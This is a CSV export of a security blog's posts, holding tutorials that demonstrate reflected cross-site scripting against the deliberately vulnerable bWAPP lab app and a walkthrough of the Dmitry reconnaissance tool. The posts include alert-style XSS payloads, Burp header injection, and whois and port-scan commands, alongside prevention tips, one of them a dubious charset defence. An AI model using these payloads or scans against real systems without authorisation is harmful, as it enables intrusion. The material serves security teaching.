id,title,blog_id,author,published_date,last_updated_date,seo_thumbnail,small_thumbnail,thumbnail,keywords,highlights,description,visibility,is_featured,featured,featured_board
4,Cross-site-Scripting - Reflected (GET & POST),cross-site-scripting-reflected-get-and-post,Anshuman Pattnaik,2019-05-17 01:25:03.740031+05:30,2021-06-04 01:32:42.11185+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/large_thumbnail.png,'{XSS,bWAPP,"Reflected XSS","Bug Bounty"}',"This is the demonstration of Cross-scripting — Reflected attack on GET &amp; POST method and for the demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><span style='"font-size: large;'">This is the demonstration of Cross-scripting - Reflected attack on GET &amp; POST method and for the demo, I''ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.</span><br></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><br></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/4MZ30SfLpgc'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_1.png'"><br></div><div><br></div><div><font size='"4'">Let''s login to bWAPP with their default username &amp; password.</font><br></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">Username - bee</span><br></div><div><div style='"font-size: large;'">Password - bug</div><div style='"font-size: large;'"><br></div><div style='"'"><b style='"'"><font size='"5'">1. Cross-site-Scripting - Reflected (GET )</font></b><br></div><div style='"font-size: large;'"><br></div><div style='"font-size: large;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_2.png'"><br></div><div style='"font-size: large;'"><br></div><div style='"'"><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (GET )</b> from the drop-down menu and click <b>Hack</b>.</font><br></div><div style='"font-size: large;'"><br></div></div><div><font size='"4'">Now on below webpage, you can able to see there are two input fields are there <b>Firstname &amp; Lastname</b> and let''s enter the first name as <i>Anshuman </i>and last name as <i>Pattnaik </i>and let''s see what''s happening.<br></font></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_3.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">You can able to see the value of the <b>first name &amp; last name</b> both are reflecting in the address bar. So if the variable''s value will reflect in the address bar then there is a possibility that an attacker can tamper that variable''s value and inject some <b>JavaScript&nbsp;</b>code.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">So to test let''s try to print the <b>firstname </b>in bold character and see what''s happening .</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_4.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can able to see the <b>firstname </b>value <b>Anshuman </b>printed in bold letter and in the address bar also it''s HTML <b>&lt;b&gt;</b> reflecting. So from this, we can know that proper HTML encoding is done properly.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">If the web application developer doesn''t do character encoding properly then these type of issue will come.<br></font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_5.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">So now as the input field accepting <b>&lt; &amp; &gt;</b> tag then we can inject <b>&lt;script&gt;</b> tag so let''s try a simple JavaScript&nbsp;code and hit GO.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_6.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">As you can see it shows the <b>firstname </b>value <b>Anshuman </b>in an alert dialogue box so from this experiment you can know that on this web page both the input fields are XSS vulnerable.</font></div><div><br></div><div><b><font size='"5'"><br></font></b></div><div><b><font size='"5'">2. Cross-site-Scripting - Reflected (POST )</font></b><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_7.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting — Reflected (POST )</b> from the drop-down menu and click <b>Hack</b>.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_8.png'"><br></div><div><br></div><div><font size='"4'">Now the same input we can try again the <b>firstname </b>as <b>&lt;b&gt;Anshuman&lt;/b&gt;</b> and <b>lastname </b>as <b>Pattnaik</b>.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_9.png'"><br></div><div><br></div><div><font size='"4'">As you can see we got the same output as GET the <b>firstname </b>printed in a bold letter.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_10.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">So let''s try inject <b>&lt;script&gt;</b> tag and let''s see what’s happening.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-get-post/cross_site_scripting_reflected_get_post_11.png'"><br></div><div><br></div><div><font size='"4'">As you can see it shows the <b>firstname </b>value <b>Anshuman </b>in an alert dialogue box. So here these two input fields are XSS vulnerable.</font><br></div><div><br></div><div><b><font size='"5'">Note</font></b></div><div><br></div><div><font size='"4'">There two things to prevent XSS in both GET and POST</font></div><div><div><ol><li><font size='"4'">Always do proper validation and sanitization of the special characters.</font></li><li><span style='"font-size: large;'">Use tag of charset - <b>ISO-8859-1</b> on your web pages.</span></li></ol></div></div><div><div class='"code-toolbar'"><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Cop</button></div></div></div></div><div><div class='"code-toolbar'"><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">C</button></div></div></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span><span class='"token constant'">META</span> http<span class='"token operator'">-</span>equiv<span class='"token operator'">=</span><span class='"token string'">'"Content-Type'"</span> content<span class='"token operator'">=</span><span class='"token string'">'"text/html; charset= ISO-8859–1'"</span><span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><font size='"4'">In that case, Cross-Site Scripting attack can be reduce the number of possible forms of a script injection. So it''s good to follow the above steps.</font><br></div><div><br></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span><br></div>",t,f,"",f
2,Dmitry Information Gathering Tool,dmitry-information-gathering-tool,Anshuman Pattnaik,2019-05-14 01:24:33.602849+05:30,2021-06-04 01:33:33.84649+05:30,https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/seo_thumbnail.png,https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/small_thumbnail.png,https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/large_thumbnail.png,"{'"Information Gathering'",CyberSecurity,'"Kali Linux'"}","Deep magic information gathering tool is widely popular for Dmitry and from this tool you can collect much possible information. And this is a command line based tools and in Kali Linux, it’s a part of Information Gathering tool.","<font size='"4'">Deep magic information-gathering tool is widely popular for Dmitry and from this tool you can collect much possible information. And this is a command-line based tools and in Kali Linux, it''s a part of the Information Gathering tool.</font><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/Wr3zHEJCJLM'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_1.png'"><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_2.png'"><br></div><div><br></div><div><b style='"'"><font size='"5'">Find whois information of domain</font></b></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">dmitry <span class='"token operator'">-</span>w example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_3.png'"><br></div><div><span style='"font-size: large;'"><br></span></div><div><span style='"font-size: large;'">As you can able to see from the above screenshot it can able to fetch many important details like <b>Domain Name, Registry Domain ID</b> and etc.</span><br></div><div><span style='"font-size: large;'"><br></span></div><div><b style='"'"><font size='"5'">Export Results</font></b></div><div><br></div><div><div class='"code-toolbar'"><pre class='" language-js'">dmitry -wo example.com<br></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_4.png'"><br></div><div><br></div><div><font size='"4'">As you can see it''s writing output to ''<b>example.com.txt''</b>&nbsp;so all the details it exported to a text file, it will be helpful to review it later.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Find Subdomains</font></b></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'">dmitry <span class='"token operator'">-</span>se example<span class='"token punctuation'">.</span><span class='"token property-access'">com</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_5.png'"><br></div><div><br></div><div><font size='"4'">As you can see it can able to fetch 0 subdomains and 3 E-Mail(s) for host <b>example.com&nbsp;</b></font><span style='"font-size: large;'">but you can try some other domains</span><b style='"font-size: large;'">.</b></div><div><b style='"font-size: large;'"><br></b></div><div><b style='"'"><font size='"5'">Port Scanning</font></b></div><div><font size='"4'"><b><br></b></font></div><div><div class='"code-toolbar'"><pre class='" language-js'"><code class='" language-js'">dmitry -p example.com </code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/dmitry-information-gathering-tool/dmitry_tool_6.png'"><br></div><div><br></div><div><font size='"4'">As you can see it can able to scan 150 ports and 0 ports were in the state closed. Only port 80 is open. Now like the same way you can practice other commands and check what other results are you getting.</font></div><div><font size='"4'"><br></font></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div>",t,f,"",f
6,Cross-Site-Scripting - Reflected (AJAX/JSON),cross-site-scripting-reflected-ajax-json,Anshuman Pattnaik,2019-05-20 01:25:23.615026+05:30,2021-06-05 20:28:41.338067+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/large_thumbnail.png,"{Ajax,'"Reflected XSS'",bWAPP,XSS}","This is the demonstration of Cross-Site-Scripting attack on Ajax webpage with JSON response and for this demo, I’ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site-Scripting attack on Ajax webpage with JSON response and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/3QaEi3__35c'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (AJAX/JSON )</b> from the drop-down menu and click <b>Hack</b>.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_2.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">As you can see here it''s asking the user to enter the movie name but you can see here there is no search button because as it''s an AJAX web page it will update the web page without reloading the page and the client-server interaction will happen in the background.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">So let''s enter the same movie name again <b>Skyfall</b>.</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_3.png'"><font size='"4'"><br></font></div><div><br></div><div><font size='"4'">Now as you can see here the movie name reflect on the web page as it''s reflecting we can inject JavaScript&nbsp;code.</font><br></div><div><font size='"4'"><br></font></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>script<span class='"token operator'">&gt;</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''Skyfall''</span><span class='"token punctuation'">)</span><span class='"token operator'">&lt;</span><span class='"token operator'">/</span>script<span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_4.png'"><br></div><div><br></div><div><font size='"4'">As you can see here our payload didn''t work and we received 0 results because the response is coming in JSON and this JavaScript code inside the double quotes.</font><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_5.png'"><br></div><div><br></div><div><div><font size='"4'">As you can see here inside this PHP script our current response inside this double quote and as this code written inside a PHP script and as you guys might have known PHP is a hidden programming language and attacker won''t get access to see this code. So if JavaScript&nbsp;code will fail then the attacker can inject JavaScript&nbsp;code inside HTML tag.</font></div><div><br></div><div><font size='"4'">To test the HTML tag let''s print our movie name <b>'"Skyfall'"</b> in a bold character.</font></div></div><div><br></div><div><div class='"code-toolbar'"><pre class='" language-js'">&lt;b&gt;Skyfall&lt;/b&gt;</pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_6.png'"><br></div><div><br></div><div><font size='"4'">As you see here we are able to inject HTML tag inside double quote. So let''s enter our payload.</font><br></div><div><br></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>img src<span class='"token operator'">=</span>x onerror<span class='"token operator'">=</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''Skyfall''</span><span class='"token punctuation'">)</span><span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-json/cross_site_scripting_reflected_ajax_json_7.png'"><br></div><div><br></div><div><font size='"4'">As you can see here we successfully launch an XSS attack on an AJAX webpage.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How do we prevent this type of attack?</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><font size='"4'">A better way to prevent this attack is proper HTML encoding of special characters and if you are using PHP script then you can use '"<b>htmlspecialchars</b>'" API to convert special characters to HTML entities.</font></div><div><ol><li><font size='"4'">&amp;(ampersand) - &amp;</font><br></li><li><font size='"4'">'"(double quote) - '",unless ENT_NOQUOTES is set<br></font></li><li><font size='"4'">''(single quote) - '' (for ENT_HTML401) or '' (for ENT_XML1, ENT_XHTML or ENT_HTML5), but only when ENT_QUOTES is set<br></font></li><li><font size='"4'">&lt; (less than) - &lt;<br></font></li><li><font size='"4'">&gt; (greater than) - &gt;<br></font></li></ol><div><font size='"4'"><b><br></b></font></div><div><b style='"'"><font size='"5'">For more information please follow these below links</font></b></div></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'"><a href='"https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001)'"><font color='"#dd4124'">Testing for AJAX Vulnerabilities (OWASP-AJ-001)</font></a></font><a href='"https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001)'"><font color='"#dd4124'"><br></font></a></li><li><font size='"4'"><a href='"https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet'"><font color='"#dd4124'">XSS (Cross Site Scripting) Prevention Cheat Sheet</font></a><br></font></li><li><a href='"https://github.com/OWASP/CheatSheetSeries'"><font color='"#dd4124'">OWASP/Cheat Sheet Series</font></a></li></ol></div><div><br></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span><br></div>",t,f,.,f
7,Cross-Site-Scripting - Reflected (AJAX/XML),cross-site-scripting-reflected-ajax-xml,Anshuman Pattnaik,2019-05-22 01:25:34.215997+05:30,2021-06-04 01:32:25.845372+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/large_thumbnail.png,"{'"Bug Bounty'",'"Reflected XSS'",bWAPP,XML}","This is the demonstration of Cross-Site Scripting attack in XML response on AJAX webpage and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site Scripting attack in XML response on AJAX webpage and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/5p0Hra2i35I'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (AJAX/XML )</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_2.png'"><font size='"4'"><br></font></div><div><br></div><div><br></div><div><div><font size='"4'">As we got the same user interface again and it''s asking the user to enter the movie name and we will follow the same steps again like on our last tutorial <a href='"https://hackbotone.com/blog/cross-site-scripting-reflected-ajax-xml#'"><font color='"#dd4124'">(Cross-site-Scripting - Reflected (AJAX/JSON))</font></a>. So I''ll enter the movie name '"<b>Skyfall</b>'" and you can see above the movie name reflecting on the webpage so we can inject our payload.</font></div></div><div><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_3.png'"><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><div style='"'"><font size='"4'"><br></font></div><div style='"'"><font size='"4'">As per the above screenshot, you can see when I try to print the movie name in bold character using angular parentheses it failed the result came '"<b>undefined</b>'" because in XML response if you try to enter open and closed angular parentheses then the application will build a new node and the XML document will be invalid.&nbsp;</font></div><div style='"'"><span style='"font-size: large;'"><br></span></div><div style='"'"><span style='"font-size: large;'">So in order to inject our payload, we need to do HTML encoding, so let''s encode this HTML tag.</span></div></div><div style='"'"><span style='"font-size: large;'"><br></span></div><div style='"'"><span style='"font-size: large;'"><br></span></div><div style='"'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_4.png'"><span style='"font-size: large;'"><br></span></div><div><font size='"4'"><br></font></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">Encode HTML tag</font></b><br></div><div><br></div><div><div><font size='"4'"><a href='"http://www.convertstring.com/EncodeDecode/HtmlEncode'"><font color='"#dd4124'">Html Encode/Decode</font></a> but you can also use other sites. As you can see here it''s encoded and let''s copy this and paste into our input box.</font></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_5.png'"><br></div><div><br></div><div><font size='"4'">And it''s working now we are able to print our movie name in bold character.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">How it''s working?</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font size='"4'">XML Ampersand: '"&amp;'" symbol is used to represent entities and all the entities are mapped to Unicode charset.</font><br></li><li><font size='"4'">And the format of each entity symbol is '"&amp;symbol;'"<br></font></li><li><font size='"4'">And if in the current design '"&amp;'" symbol is not encoded with '"&amp;'" then you could be used to test XML injection.<br></font></li><li><font size='"4'">So in order to prevent this attack, the proper encoding of special characters are highly required.<br></font></li></ol><div><br></div></div><div><div class='"code-toolbar'"><pre class='"  language-js'"><code class='"  language-js'"><span class='"token operator'">&lt;</span>img src<span class='"token operator'">=</span>x onerror<span class='"token operator'">=</span><span class='"token function'">alert</span><span class='"token punctuation'">(</span><span class='"token string'">''Skyfall''</span><span class='"token punctuation'">)</span><span class='"token operator'">&gt;</span></code></pre><div class='"toolbar'"><div class='"toolbar-item'"><button type='"button'">Copy</button></div></div></div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_6.png'"><br></div><div><br></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-ajax-xml/cross_site_scripting_reflected%20_ajax_xml_7.png'"><br></div><div><br></div><div><font size='"4'">As you can see after encoding we are successfully able to inject XSS payload in the XML response and as I have already mentioned preventing this attack if you do proper encoding of special characters then we can prevent this attack.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">For more information please follow these below links</font></b><br></div><div><b style='"'"><font size='"5'"><br></font></b></div><div><ol><li><font style='"'"><font size='"4'"><a href='"https://www.owasp.org/index.php/Testing_for_AJAX_Vulnerabilities_(OWASP-AJ-001)'"><font color='"#dd4124'">Testing for AJAX Vulnerabilities (OWASP-AJ-001)</font></a></font><br></font></li><li><font style='"'"><font size='"4'"><a href='"https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet'"><font color='"#dd4124'">XSS (Cross Site Scripting) Prevention Cheat Sheet</font></a></font><br></font></li><li><font style='"'"><font size='"4'"><font color='"#dd4124'"><a href='"https://github.com/OWASP/CheatSheetSeries'"><font color='"#dd4124'">OWASP/Cheat Sheet Series</font></a></font></font><br></font></li></ol><div><font size='"4'"><br></font></div></div><div><span style='"font-size: large;'">Thank you for reading this post and Happy Hacking :)</span></div>",t,f,"",f
9,Cross-Site-Scripting - Reflected (Custom Header),cross-site-scripting-reflected-custom-header,Anshuman Pattnaik,2019-05-24 01:25:50.700599+05:30,2021-06-02 01:25:50.700613+05:30,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/seo_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/small_thumbnail.png,https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/large_thumbnail.png,"{XSS,bWAPP,'"Penetration Testing'",'"Reflected XSS'"}","This is the demonstration of Cross-Site Scripting attack in Custom header parameter and for this demo, I’ll be using bWAPP and bWAPP is a buggy web application and we can use to test various vulnerabilities in the web.","<div><font size='"4'">This is the demonstration of Cross-Site Scripting attack in Custom header parameter and for this demo, I''ll be using bWAPP which is a buggy web application and we can use to test various vulnerabilities in the web.</font></div><div><font size='"4'"><br></font></div><div><font size='"4'">bWAPP Official Link:- <a href='"http://www.itsecgames.com/'"><font color='"#dd4124'">http://www.itsecgames.com/</font></a></font></div><div><font size='"4'"><br></font></div><div><div class='"video-responsive'">
    <iframe width='"420'" height='"315'" src='"https://www.youtube.com/embed/Ks9Jcu60tTk'" frameborder='"0'" allowfullscreen='"'"></iframe></div></div><div><br></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_1.png'"><br></div><div><br></div><div><font size='"4'">Now please choose <b>Cross-site-Scripting - Reflected (Custom Header)</b> from the drop-down menu and click Hack.</font><br></div><div><font size='"4'"><br></font></div><div><b style='"'"><font size='"5'">What is Custom Header?</font></b><br></div><div><font size='"4'"><br></font></div><div><div><font size='"4'">Custom HTTP headers are commonly used to provide additional information and it will be helpful in case of troubleshooting by the web developers.&nbsp;And Content-Type is the best example for custom HTTP header and from this header parameter, we are sending data in different formats either from (JSON or XML).</font></div></div><div><font size='"4'"><br></font></div><div><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_2.png'"><font size='"4'"><br></font></div><div><br></div><div><div><font size='"4'">So in this demo bWAPP is the custom header and from this header, we will inject XSS payload. To inject the payload, we need to intercept the HTTP request and we can use Burp suite.</font></div></div><div><font size='"4'"><br></font></div><div><div style='"text-indent: 4.08px; color: rgb(52, 58, 64);'"><span style='"text-indent: 4.08px;'"><b><font size='"5'">What is Burp Suite?</font></b><br></span></div><div style='"text-indent: 4.08px; color: rgb(52, 58, 64);'"><span style='"font-size: large; text-indent: 4.08px;'"><br></span></div><div style='"text-indent: 4.08px;'"><span style='"color: rgb(52, 58, 64); font-size: large; text-indent: 4.08px;'">Burp suite is a graphical tool which is used to test Web application security and by the help of this tool, we can identify the vulnerability in the web.&nbsp;</span><span style='"font-size: large; text-indent: 4.08px;'"><font color='"#343a40'">If you want to know more&nbsp;</font></span><font color='"#343a40'" style='"font-size: large; text-indent: 4.08px;'">about this tool then you can visit their official website&nbsp;</font><a href='"https://portswigger.net/'" style='"font-size: large; text-indent: 4.08px;'"><font color='"#dd4124'">Portswigger</font></a><font color='"#343a40'" style='"font-size: large; text-indent: 4.08px;'">.</font></div></div><div style='"text-indent: 4.08px;'"><span style='"font-size: large; text-indent: 4.08px;'"><font color='"#343a40'"><br></font></span></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_3.png'"><span style='"font-size: large; text-indent: 4.08px;'"><font color='"#343a40'"><br></font></span></div><div style='"text-indent: 4.08px;'"><font size='"4'">So to intercept the first request go to the proxy tab and click on the intercept button to start intercepting the HTTP request.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_4.png'"></div><div style='"text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><font size='"4'">And after that go to the portal page and choose <b>(Cross-Site Scripting — Reflected Custom Header)</b> and click Hack.</font></span></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_5.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font size='"4'">So now if you go to the Burp you can able to see the intercept request and click forward until you reach the '"<b>xss_custom_header.php</b>'" page.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_6.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><font size='"4'">So now add bWAPP custom header and to test let''s give a simple message '"<i>This is a buggy custom header</i>'" and click forward.</font></span><br></div><div style='"text-indent: 4.08px;'"><span style='"text-indent: 4.08px;'"><font size='"4'"><br></font></span></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_7.png'"><span style='"text-indent: 4.08px;'"><font size='"4'"><br></font></span></div><div style='"text-indent: 4.08px;'"><font size='"4'">As you can see here our message reflecting on the web page so as it''s reflecting we can inject our payload.</font><br></div><div style='"text-indent: 4.08px;'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><img src='"https://assets.hackbotone.com/assets/cross-site-scripting-reflected-custom-header/cross_site_scripting_reflected%20_custom_header_8.png'"><font size='"4'"><br></font></div><div style='"text-indent: 4.08px;'"><br></div><div style='"text-indent: 4.08px;'"><font size='"4'">So let''s go to the burp suite and turn off the intercept. And follow the same steps again to intercept the request.</font><br></div><div style='"text-indent: 4.08px;'"><font 